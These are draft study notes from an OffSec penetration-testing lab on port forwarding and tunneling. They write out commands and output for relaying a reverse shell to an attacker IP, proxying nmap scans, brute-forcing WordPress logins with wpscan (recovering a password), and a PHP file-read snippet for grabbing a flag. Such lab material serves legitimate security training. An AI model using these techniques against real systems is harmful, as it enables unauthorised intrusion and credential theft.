---
title: offsec labs
aliases: []
tags:
- topic/offsec-labs
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[clear_rules.sh]]'
- '[[ssh_local_port_forwarding.sh]]'
- '[[ssh_remote_port_forward.sh]]'
- '[[ssh]]'
- '[[nc]]'
- '[[proxychains]]'
- '[[nmap-1787746090]]'
- '[[curl]]'
- '[[firefox]]'
- '[[wpscan]]'
related_techniques:
- '[[port-forwarding]]'
- '[[reverse-shell]]'
- '[[dynamic-port-forwarding]]'
- '[[ssh-tunneling]]'
related_tactics:
- '[[lateral-movement]]'
- '[[defense-evasion]]'
- '[[discovery]]'
- '[[execution]]'
related_services:
- '[[ssh]]'
- '[[mysql-1787747546]]'
- '[[smb-1787747781]]'
- '[[http]]'
- '[[ftp]]'
- '[[smtp]]'
- '[[pop3]]'
- '[[imap]]'
- '[[https]]'
- '[[pptp]]'
- '[[vnc]]'
- '[[http-proxy]]'
related_os:
- '[[/root/port_forwarding_and_tunneling/]]'
- '[[flag.txt]]'
- '[[rev.sh]]'
- '[[192.168.121.52]]'
- '[[192.168.119.121]]'
- '[[/home/flag.txt]]'
- '[[/etc/proxychains.conf]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# offsec labs

## Penetration Testing Exercises
These exercises are to be performed on your own Kali, Debian, and Windows lab server machines. The first set of exercises involves connecting to a dedicated Linux lab client and running scripts to set up port forwarding and tunneling. The second set of exercises involves using SSH to forward a reverse shell from a target machine to your local machine. The third set of exercises involves setting up a SOCKS4 proxy and performing an nmap scan through the proxy.

**Exercise 1:**
- Connect to your dedicated Linux lab client and run the `clear_rules.sh` script from `/root/port_forwarding_and_tunneling/` as root.
- Run the `ssh_local_port_forwarding.sh` script from `/root/port_forwarding_and_tunneling/` as root.
- Take note of the Linux client and Windows Server 2016 IP addresses shown in the Student Control Panel.
- Attempt to replicate the smbclient enumeration covered in the above scenario.

**Exercise 2:**
- Connect to your dedicated Linux lab client via SSH and run the `clear_rules.sh` script from `/root/port_forwarding_and_tunneling/` as root.
- Close any SSH connections to your dedicated Linux lab client and then connect as the student account using `rdesktop` and run the `ssh_remote_port_forward.sh` script from `/root/port_forwarding_and_tunneling/` as root.
- Attempt to replicate the SSH remote port forwarding covered in the above scenario and ensure that you can scan and interact with the MySQL service.

**Exercise 3:**
- The target VM #1 machine has an exploit that is triggered by root every minute, executing a basic reverse shell. The shell is trying to connect back to the internal port 5555 on 127.0.0.1 on that server, and the server has no tools available to catch this shell. To solve this challenge, forward this reverse shell callback from the remote server to your local machine and then use this shell to read the flag.

**Exercise 4:**
- Redirect 127.0.0.1:5555 to your attacker IP using the following command:
```
ssh -N -R 127.0.0.1:5555:192.168.119.121:5555 student@$IP -p 2222
```
- After establishing the connection, use `nc` to listen on port 5555 on your local machine:
```
nc -l -p 5555
```
- The output will include a reverse shell and a flag file. The flag can be obtained by running `cat flag.txt`.

**Exercise 5:**
- Connect to your dedicated Linux lab client and run the `clear_rules.sh` script from `/root/port_forwarding_and_tunneling/` as root.
- Take note of the Linux client and Windows Server 2016 IP addresses.
- Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.
- Perform a successful nmap scan against the Windows Server 2016 machine through the proxy.
- Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?

**Exercise 6:**
- There is a service running on some TCP port in the range of 30000-35000 on the target VM #1. Find it, and you will find the flag. Note: this scan will take a couple minutes to complete, even with you only scanning such a limited range.

**Additional Information:**
- Install `proxychains` on your Kali machine using the following command:
```
sudo apt install proxychains
```
- View the configuration of `proxychains` using the following command:
```
cat /etc/proxychains.conf
```

## Port Tunneling Setup
```bash
socks5  127.0.0.1 9050

export IP=192.168.121.52

sudo ssh -N -D 127.0.0.1:9050 student@$IP -p 2222
```

```bash
proxychains sudo nmap -T4 -sS --open -p 30000-35000 $IP
```

```
Host is up (0.30s latency).
Not shown: 5000 closed tcp ports (conn-refused)
PORT      STATE SERVICE
34023/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1475.41 seconds
```

```bash
sudo proxychains nmap -sT 127.0.0.1 -p30000-35000
```

```
port is 34023
```

```bash
proxychains nc -nv 127.0.0.1 34023
```

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023  ...  OK
(UNKNOWN) [127.0.0.1] 34023 (?) open : Operation now in progress
ls
flag.txt
cat flag.txt
OS{e592a33511a326940ea2b8ab63f65e4c}
```

## Web Application Access
```bash
sudo ssh -N -D 127.0.0.1:8080 student@$IP -p 2222
```

```bash
proxychains nmap --top-ports=20 -sT -Pn 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 16:32 AEST
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:21 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:25 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:111 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:23 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1723 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:135 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:995 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:3389 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:139 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:443 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:3306  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:143 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:993 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:445 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:110 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:5900 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:8080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:53 <--socket error or timeout!
Nmap scan report for localhost (127.0.0.1)
Host is up (0.26s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp open   mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.42 seconds
```

Note: The WordPress instance is only accessible locally and requires administrative access to retrieve the flag.

## Proxy Setup
The following commands demonstrate setting up a proxy using `proxychains` to route traffic through a local proxy server:

```bash
# Using `curl` to fetch a webpage
┌──(kali㉿kali)-[~]
└─$ proxychains curl 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:80  ...  OK
<!doctype html>
<html lang="en-US" >
<head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Port Forwarding Challenge &#8211; Just another WordPress site</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Port Forwarding Challenge &raquo; Feed" href="http://127.0.0.1/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="Port Forwarding Challenge &raquo; Comments Feed" href="http://127.0.0.1/index.php/comments/feed/" />
                <script>
                        window._wpemojiSettings = {"baseUrl":"https://s.w.org/images/core/emoji/13.1.0/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/13.1.0/svg/","svgExt":".svg","source":{"concatemoji":"http://127.0.0.1/wp-includes/js/wp-emoji-release.min.js?ver=5.8.2"};
                        !function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128

└─$ proxychains firefox
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
ATTENTION: default value of option mesa_glthread overridden by environment.
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 [proxychains] DLL init: proxychains-ng 4.16
<--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 [GFX1-]: Unrecognized feature ACCELERATED_CANVAS2D
<--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs
<--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 [proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
<--socket error or timeout!
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  ::1:1080 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:80  ...  OK
[proxychains] DLL init: proxychains-ng 4.16
```

```bash
# Using `wpscan` to scan a WordPress site
┌──(kali㉿kali)-[~]
└─$ proxychains wpscan --url http://127.0.0.1 --passwords /usr/share/wordlists/john.lst
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /
```

## WordPress Scan Results
XML-RPC seems to be enabled: http://127.0.0.1/xmlrpc.php

WordPress readme found: http://127.0.0.1/readme.html

Upload directory has listing enabled: http://127.0.0.1/wp-content/uploads/

The external WP-Cron seems to be enabled: http://127.0.0.1/wp-cron.php

WordPress version 5.8.2 identified (Insecure, released on 2021-11-10).

WordPress theme in use: twentytwentyone
Location: http://127.0.0.1/wp-content/themes/twentytwentyone/
Last Updated: 2022-11-02T00:00:00.000Z
Readme: http://127.0.0.1/wp-content/themes/twentytwentyone/readme.txt
[!] The version is out of date, the latest version is 1.7
Style URL: http://127.0.0.1/wp-content/themes/twentytwentyone/style.css?ver=1.4
Style Name: Twenty Twenty-One
Style URI: https://wordpress.org/themes/twentytwentyone/
Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
Author: the WordPress team
Author URI: https://wordpress.org/

Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.

Enumerating Config Backups (via Passive and Aggressive Methods)
[proxychains] Dynamic chain  ...  127.0.0.1:8080  ...  127.0.0.1:80  ...  OK
[i] No Config Backups Found.

Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================> (10 / 10) 100.00% Time: 00:00:01
[proxychains] Dynamic chain  ...  127.0.0.1:8080  ...  127.0.0.1:80  ...  OK
[i] User(s) Identified:

[+] offsec
Found By: Author Posts - Author Pattern (Passive Detection)
Confirmed By:
Rss Generator (Passive Detection)
Wp Json Api (Aggressive Detection)
 - http://127.0.0.1/index.php/wp-json/wp/v2/users/?per_page=100&page=1
Author Id Brute Forcing - Author Pattern (Aggressive Detection)
Login Error Messages (Aggressive Detection)

## Results
```
[!] Valid Combinations Found:
 | Username: offsec, Password: 141414

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar 13 19:25:02 2023
[+] Requests Done: 2540
[+] Cached Requests: 49
[+] Data Sent: 825.492 KB
[+] Data Received: 15.486 MB
[+] Memory used: 280.785 MB
[+] Elapsed time: 00:06:37
```

## PHP Script
```php
<?php
$myfile = fopen("/home/flag.txt", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/home/flag.txt"));
fclose($myfile);
?>
```

## References
- http://codex.wordpress.org/XML-RPC_Pingback_API
- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
- https://www.iplocation.net/defend-wordpress-from-ddos
- https://github.com/wpscanteam/wpscan/issues/1299
- https://wpscan.com/register

